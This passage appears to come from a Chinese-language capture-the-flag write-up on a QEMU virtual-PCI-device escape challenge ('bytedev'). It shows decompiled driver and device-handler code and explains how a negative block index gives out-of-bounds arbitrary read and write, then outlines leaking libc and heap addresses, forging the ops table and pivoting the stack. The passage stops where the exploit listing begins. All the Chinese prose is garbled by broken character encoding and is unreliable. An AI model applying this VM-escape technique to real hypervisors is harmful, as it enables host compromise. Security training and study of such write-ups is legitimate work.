class="number">0LL</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x18</span>) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_EE0);</span><br><span class="line">LABEL_29:</span><br><span class="line">      pci_release_regions(a1);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">0x20</span>) = *(_QWORD *)(a1 + <span class="number">0x3F8</span>);</span><br><span class="line">    raw_spin_lock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">0x100</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i;</span><br><span class="line">      <span class="keyword">if</span> ( !bytedev_minor_num[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        bytedev_minor_num[(<span class="keyword">int</span>)i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="number">-1</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    raw_spin_unlock(&amp;bytedev_lock_minor_num);</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_F08);</span><br><span class="line">LABEL_28:</span><br><span class="line">      pci_iounmap(a1, *(_QWORD *)(v4 + <span class="number">24</span>));</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v12, <span class="number">0x40</span>uLL, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;bytedev&quot;</span>, v7);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12[<span class="number">0</span>] = <span class="number">0x76656465747962</span>LL;</span><br><span class="line">    v8 = device_create(bytedev_class, <span class="number">0LL</span>, v7 | (bytedev_major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, v12);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v8;</span><br><span class="line">      printk(&amp;unk_F30);</span><br><span class="line">      bytedev_set_unused_minor_num(v7);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="number">32LL</span>;</span><br><span class="line">    v10 = (_DWORD *)(v4 + <span class="number">48</span>);</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v10++ = <span class="number">0</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">8</span>) = a1;</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">176</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *(_QWORD *)v4 = v8;</span><br><span class="line">    *(_DWORD *)(v4 + <span class="number">16</span>) = v7;</span><br><span class="line">    bytedev_arr[v7] = v4;</span><br><span class="line">    printk(&amp;unk_F60);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°ä¸­ä½¿ç”¨äº†<code>pci_request_regions</code>å¯¹èµ„æºè¿›è¡Œäº†æ¢æµ‹å’Œå ç”¨ï¼Œå¯¼è‡´å¦‚æœç›´æ¥ä½¿ç”¨ç”¨æˆ·æ€ç¨‹åºå¯¹PCIè®¾å¤‡ä½¿ç”¨æ—¶ä¼šå¤±è´¥ï¼Œ<strong>è¿™é‡Œå¦‚æœææƒæˆåŠŸçš„è¯å¯ä»¥é€šè¿‡å¸è½½é©±åŠ¨æ¨¡å—æ¥å®ç°å–æ¶ˆå¯¹èµ„æºçš„å ç”¨ä»è€Œå¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·æ€ä½¿ç”¨PCIè®¾å¤‡ã€‚</strong>ä¸è¿‡é¢˜ç›®è¿™é‡Œçš„é©±åŠ¨ä¸­å·²ç»å®Œå…¨åŒ…å«äº†å¯¹PCIè®¾å¤‡çš„ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">bytedev_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> a3; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int32 v8; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  a3 = v2;</span><br><span class="line">  v4 = *(_QWORD *)(a1 + <span class="number">0xC8</span>);</span><br><span class="line">  raw_spin_lock(v4 + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1919810</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(_QWORD *)(v4 + <span class="number">0x20</span>);</span><br><span class="line">      v8 = __indword(v7);</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        __outdword(v7 + <span class="number">1</span>, a3);</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">-14LL</span>;</span><br><span class="line">        printk(&amp;unk_CE8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">-14LL</span>;</span><br><span class="line">      printk(&amp;unk_BD1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">0x7C0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">4</span>) &amp;&amp; !*(_DWORD *)(v5 + <span class="number">0x14</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    __outdword(*(_QWORD *)(v4 + <span class="number">0x20</span>), a3);</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    printk(&amp;unk_CC0);</span><br><span class="line">LABEL_8:</span><br><span class="line">    raw_spin_unlock(v4 + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytedev_ioctl_cold_12();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œå¦‚æœä½ æƒ³è¦ä½¿ç”¨PCIè®¾å¤‡é‚£ä¹ˆä½ å¿…é¡»ä¿è¯ä¸€ç‚¹çš„æ˜¯<code>ds_0-&gt;regs.mode = 1</code>ï¼Œå› ä¸ºæ‰€æœ‰åœ°æ–¹éƒ½å­˜åœ¨è¿™ä¸ªéªŒè¯ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå°±éœ€è¦ä½¿ç”¨ioctlä¸­<code>__outdword(*(_QWORD *)(v4 + 0x20), a3);</code>è¯­å¥ã€‚è¿™é‡Œæœ€å¥½åŠ¨è°ƒä¸€ä¸‹æŸ¥çœ‹ä¸€ä¸‹<code>*(_QWORD *)(v4 + 0x20)</code>å’Œ<code>(unsigned int)&amp;current_task) + 0x7C0</code>åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œç»“æœä¼šå‘ç°è¿™é‡Œå®é™…å°±æ˜¯ä¾›æˆ‘ä»¬ä¿®æ”¹<code>ds_0-&gt;regs.mode</code>çš„å·²ç»ä¼šéªŒè¯å½“å‰æ˜¯å¦ä¸ºrootæƒé™ã€‚</p><h3 id="å‡½æ•°åˆ†æ-1"><a href="#å‡½æ•°åˆ†æ-1" class="headerlink" title="å‡½æ•°åˆ†æ"></a>å‡½æ•°åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BYTEPCIDevState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PCIDevice_0 parent_obj;</span><br><span class="line">  BYTEPCIDevRegs_0 regs;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  MemoryRegion_0 pmio;</span><br><span class="line">  <span class="keyword">char</span> *blk_mem[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å…ˆç»™ä¸€ä¸‹ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_pmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> blk_idx; <span class="comment">// ebx</span></span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">0xA3</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _mm_mfence();</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status != <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; (<span class="keyword">int</span>)val &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;regs.blk_idx = val;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx] )</span><br><span class="line">        &#123;</span><br><span class="line">          blk_idx = ds_0-&gt;regs.blk_idx;</span><br><span class="line">          ds_0-&gt;blk_mem[blk_idx] = (<span class="keyword">char</span> *)g_malloc(<span class="number">0x200</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        ds_0-&gt;regs.blk_status = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( val &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;regs.mode = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨qemuä¸­çš„æ¼æ´å°±å‡ºç°åœ¨è¿™æ ·ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œåœ¨å¯¹valçš„ç±»å‹ä¸ºintç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ä¸ºè´Ÿæ•°å› ä¸º<code>blk_mem</code>ä¸ºç»“æ„ä½“ä¸­çš„ä¸€ä¸ªæˆå‘˜å¯¼è‡´å¯ä»¥å‘ä¸Šè¿›è¡Œæº¢å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">byte_dev_mmio_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">107</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode == <span class="number">1</span> &amp;&amp; ds_0-&gt;regs.blk_status == <span class="number">2</span> &amp;&amp; size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( size == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( size == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __cdecl <span class="title">byte_dev_mmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BYTEPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (BYTEPCIDevState *)object_dynamic_cast_assert(</span><br><span class="line">                              (Object_0 *)opaque,</span><br><span class="line">                              <span class="string">&quot;byte_dev-pci&quot;</span>,</span><br><span class="line">                              <span class="string">&quot;../qemu-7.0.0/hw/misc/bytedev.c&quot;</span>,</span><br><span class="line">                              <span class="number">87</span>,</span><br><span class="line">                              <span class="string">&quot;byte_dev_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.mode != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ds_0-&gt;regs.blk_status != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size + addr &lt;= <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®mmioè¿™ä¿©å‡½æ•°å°±å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</p><h3 id="åˆ©ç”¨åˆ†æ-1"><a href="#åˆ©ç”¨åˆ†æ-1" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¿™é‡Œåˆ©ç”¨æ–¹æ³•å…¶å®æŒºç®€å•çš„ï¼Œå°±ç›´æ¥åœ¨<code>BYTEPCIDevState</code>ç»“æ„ä½“ä¸Šæ‰¾å¯ä»¥åˆ©ç”¨çš„åœ°å€è®¡ç®—å·®å€¼å³å¯ã€‚æ€è·¯å°±æ˜¯é¦–å…ˆæ³„æ¼libcåœ°å€å†æ³„æ¼heapåœ°å€å³å¯ã€‚æœ€åæ³„æ¼opsä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”ä¼ªé€ opsã€‚åœ¨æœ€ååŠ«æŒopså®ç°æ ˆè¿ç§»åˆ°å †åœ°å€å³å¯å®Œæˆåˆ©ç”¨ã€‚</p><h2 id="ç»¼ä¸Šï¼Œexp"><a href="#ç»¼ä¸Šï¼Œexp" class="headerlink" title="ç»¼ä¸Šï¼Œexp"></a>ç»¼ä¸Šï¼Œexp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span 